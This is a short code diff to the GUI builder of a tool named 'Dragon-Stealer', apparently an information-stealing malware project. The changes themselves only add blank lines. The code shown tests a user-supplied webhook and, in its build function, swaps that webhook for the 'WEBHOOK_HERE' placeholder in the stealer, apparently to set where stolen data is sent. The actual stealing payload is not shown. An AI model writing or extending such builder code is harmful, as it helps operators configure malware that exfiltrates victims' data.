@@ -13,6 +13,8 @@ else:
     # If not running on Windows, exit the program
     sys.exit()
 subprocess.run("python -m pip install -r requirements.txt", shell=False)
+
+
 def test_webhook():
     webhook_url = webhook_entry.get()
     try:
@@ -26,6 +28,8 @@ def test_webhook():
     except:
         test_webhook_label.config(text="Invalid webhook", fg="#FF0000")
     print(response.status_code)
+
+
 def build():
     search_text = "WEBHOOK_HERE"
     replace_text = webhook_entry.get()
@@ -50,6 +54,8 @@ def build():
             messagebox.showerror("Error", "Invalid webhook.")
     except Exception as e:
         tk.messagebox.showerror("Error", f"Error: {str(e)}")
+
+
 root = tk.Tk()
 root.geometry("600x400")
 root.title("Dragon-Stealer")
